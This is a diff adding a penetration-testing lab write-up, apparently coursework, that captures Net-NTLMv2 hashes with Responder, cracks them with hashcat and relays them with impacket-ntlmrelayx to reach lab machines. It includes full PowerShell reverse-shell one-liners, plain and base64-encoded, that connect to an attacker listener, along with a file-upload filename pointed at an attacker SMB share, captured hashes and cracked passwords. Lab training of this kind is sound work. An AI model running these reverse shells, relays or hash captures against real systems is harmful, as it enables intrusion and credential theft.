@@ -488,3 +488,233 @@ C:\Windows\System32>  type C:\Users\Administrator\Desktop\flag.txt
 
 
 ### Cracking Net-NTLMv2
+
+1. Follow the steps outlined in this section to obtain the Net-NTLMv2 hash in Responder. Crack it and use it to connect to VM #1 (FILES01) with RDP.
+   Find the flag on _paul's_ desktop. Attention: If the bind shell is terminated it may take up to 1 minute until it is accessible again.
+
+- Connect to bind shell port 4444
+```bash
+nc 192.168.217.211 4444
+```
+
+- Verify which user is running the shell
+- Check if user is a member of the local Admin group
+```powershell
+whoami
+	files01\paul
+
+net user paul
+	net user paul
+	User name                    paul
+	Full Name                    paul power
+	Comment                      
+	User's comment               
+	Country/region code          000 (System Default)
+	Account active               Yes
+	Account expires              Never
+	
+	Password last set            6/3/2022 10:57:06 AM
+	Password expires             Never
+	Password changeable          6/3/2022 10:57:06 AM
+	Password required            Yes
+	User may change password     Yes
+	
+	Workstations allowed         All
+	Logon script                 
+	User profile                 
+	Home directory               
+	Last logon                   4/10/2024 3:30:49 PM
+	
+	Logon hours allowed          All
+	
+	Local Group Memberships      *Remote Desktop Users *Users    <-NOTE               
+	Global Group memberships     *None
+```
+	- User isn't member of Admin group (so no Mimikatz), but is member of RDP group
+
+
+- Setup up Responder as an SMB server & use FILES01 (*192.168.217.211*) as the target
+```bash
+# Retrieve tun0 interface
+ip a
+	4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+	    link/none 
+	    inet 192.168.45.221/24 scope global tun0
+
+# Start up Responder SMB share
+#   Will list services.  Verify SMB is ON
+sudo responder -I tun0
+	...
+	SMB server                 [ON]
+	...
+	[+] Listening for events...
+```
+
+- Connect to share from victim computer
+```powershell
+dir \\192.168.45.221\test
+	Access is denied.
+```
+
+- Receive hash from Responder output
+```bash
+	[SMB] NTLMv2-SSP Client   : 192.168.217.211
+	[SMB] NTLMv2-SSP Username : FILES01\paul
+	[SMB] NTLMv2-SSP Hash     : paul::FILES01:be9ce4fce2939b3c:3D8714AD3935C477B7F4FAFD9FDB5EBF:010100000000000080DBD4DD758BDA0182598AB326C6F68A000000000200080035004E005200550001001E00570049004E002D005900570031004700310047005400590034003600320004003400570049004E002D00590057003100470031004700540059003400360032002E0035004E00520055002E004C004F00430041004C000300140035004E00520055002E004C004F00430041004C000500140035004E00520055002E004C004F00430041004C000700080080DBD4DD758BDA01060004000200000008003000300000000000000000000000002000004CE7A8BE68810A009AF25392AAC895F3BDDCA9C7559603D8F0B58A4661613A8C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320031000000000000000000
+```
+
+- Crack hash
+```bash
+# Add hash to file
+echo "paul::FILES01:be9ce4fce2939b3c:3D8714AD3935C477B7F4FAFD9FDB5EBF:010100000000000080DBD4DD758BDA0182598AB326C6F68A000000000200080035004E005200550001001E00570049004E002D005900570031004700310047005400590034003600320004003400570049004E002D00590057003100470031004700540059003400360032002E0035004E00520055002E004C004F00430041004C000300140035004E00520055002E004C004F00430041004C000500140035004E00520055002E004C004F00430041004C000700080080DBD4DD758BDA01060004000200000008003000300000000000000000000000002000004CE7A8BE68810A009AF25392AAC895F3BDDCA9C7559603D8F0B58A4661613A8C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320031000000000000000000" > paul.hash
+
+# Retrieve hashcat mode
+hashcat -h | grep -i "ntlm"
+   5600 | NetNTLMv2                                                  | Network Protocol
+
+# Crack
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt
+	...
+	123Password123
+     
+	Session..........: hashcat
+	Status...........: Cracked
+
+# Connect via RDP
+xfreerdp /cert-ignore /compression /auto-reconnect /u:paul /p:123Password123 /v:192.168.217.211
+```
+
+
+> Answer:  OS{2bbe322af29940e6f40246f5069323c4}
+
+
+
+
+2. Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application.
+   Important: Add **marketingwk01** to your **/etc/hosts** file with the corresponding IP address of the machine.
+   After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.
+
+```bash
+# Enumerate
+nmap -Pn 192.168.178.210 
+	PORT     STATE SERVICE
+	135/tcp  open  msrpc
+	139/tcp  open  netbios-ssn
+	445/tcp  open  microsoft-ds
+	3389/tcp open  ms-wbt-server
+	8000/tcp open  http-alt
+
+# Add to /etc/hosts
+sudo echo "192.168.178.210 marketingwk01" >> /etc/hosts
+
+# Start Responder
+sudo responder -I tun0
+```
+
+- Open Burp & intercept file upload
+![](15.3.3ex_upload.png)
+
+- Send to Repeater; change `filename=" "` value to point to Responder's SMB share
+![](15.3.3ex_repeater.png)
+
+```bash
+# Get hash output from Responder
+[+] Listening for events...                                                                                               
+
+	[SMB] NTLMv2-SSP Client   : 192.168.178.210
+	[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
+	[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:a1c9978191af4d3c:2EE3947F50A113E2B8C1627467133E92:01010000000000008075874CEB8CDA017D2759D8EB7A51970000000002000800470049005800340001001E00570049004E002D004F003000300036004E0037003600390043004100520004003400570049004E002D004F003000300036004E003700360039004300410052002E0047004900580034002E004C004F00430041004C000300140047004900580034002E004C004F00430041004C000500140047004900580034002E004C004F00430041004C00070008008075874CEB8CDA01060004000200000008003000300000000000000000000000002000006F644B0E22B3E4A8793FE43233EC77CB7F34C96DDFB13C01BB50071632F9F2EA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300036000000000000000000
+
+# Create hash file
+echo "sam::MARKETINGWK01:a1c9978191af4d3c:2EE3947F50A113E2B8C1627467133E92:01010000000000008075874CEB8CDA017D2759D8EB7A51970000000002000800470049005800340001001E00570049004E002D004F003000300036004E0037003600390043004100520004003400570049004E002D004F003000300036004E003700360039004300410052002E0047004900580034002E004C004F00430041004C000300140047004900580034002E004C004F00430041004C000500140047004900580034002E004C004F00430041004C00070008008075874CEB8CDA01060004000200000008003000300000000000000000000000002000006F644B0E22B3E4A8793FE43233EC77CB7F34C96DDFB13C01BB50071632F9F2EA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300036000000000000000000" > sam.hash
+
+# Verify hash mode
+hashcat -h | grep -i "ntlm"
+   5600 | NetNTLMv2                                                  | Network Protocol
+
+# Crack
+hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt
+	...DISISMYPASSWORD
+
+# Connect to the system & grab flag
+xfreerdp /cert-ignore /compression /auto-reconnect /u:sam /p:DISISMYPASSWORD /v:192.168.178.210 /drive:test,/home/kali/exercises/pw
+
+# Flag's on the desktop
+```
+
+
+> Answer:  OS{36dd0554d9bd5619747662a3933c592a}
+
+
+
+### Relay Attack Net-NTLMv2
+
+1. Use the methods from this section to get access to VM #2 (FILES02 @ 192.168.178.212) of VM Group 1 and obtain the flag on the desktop of the user _files02admin_.
+   If the bind shell on VM #1 (FILES01 @ 192.168.178.211) is terminated it may take up to 1 minute until it is accessible again.
+
+- Create base64 encoded Powershell reverse shell oneliner port 4444 on www.revshells.com
+
+```bash
+# Tab 1: Start relay tool - No http server; Add support for SMB2; Target FILES02; With base64 encoded Powershell reverse shell oneliner
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.178.212 -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+# Tab 2: Start nc listener
+nc -nlvp 4444
+
+# Tab 3: Connect to FILES01's bind shell
+nc 192.168.178.211
+```
+
+
+> Answer:  OS{de179c2c6d67508f79699c13d85d840d}
+
+
+
+
+2. **Capstone Exercise**: Find a way to obtain a Net-NTLMv2 hash from the user _anastasia_ via the web application on VM #3 (BRUTE2 @ 192.168.178.202) and relay it to VM #4 (FILES02 @ 192.168.178.212).
+
+```bash
+# Enumerate
+sudo nmap -Pn 192.168.178.202
+	PORT     STATE SERVICE
+	21/tcp   open  ftp
+	135/tcp  open  msrpc
+	139/tcp  open  netbios-ssn
+	445/tcp  open  microsoft-ds
+	3389/tcp open  ms-wbt-server
+	8000/tcp open  http-alt
+```
+
+- Retrieve two reverse shell payloads from www.revshells.com
+```powershell
+# Reverse shell port 4444 to submit to webapp & connect to BRUTE2 webserver
+$LHOST = "192.168.45.206"; $LPORT = 4444; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
+
+# Reverse shell port 5555 to connect to FILES02 via hash relay
+powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+```
+
+```bash
+# Tab 1 start nc listener for webserver BRUCE2
+nc -nlvp 4444
+
+# Tab 2 start nc listener for FILES02
+nc -nlvp 5555
+
+# Tab 3 start relay attack w/ 2nd PS revshell
+impacket_ntlmrelayx --no-http-server -smb2support -t 192.168.178.212 -c "powershell -e JABjAGwAaQBlAG4........=="
+```
+
+- Submit 1st reverse shell PS to webapp
+![](15.3.3.2ex_powershellupload.png)
+
+```powershell
+# Tab 1 - connection to BRUCE2
+# Navigate to faux share
+dir \\192.168.45.206\test
+
+# Tab 2 - connection to FILES02
+type C:\Users\anastasia\Desktop\flag.txt
+```
+
+> Answer:  OS{697dc6f0aa5415ad4729da69f3e54fb4}
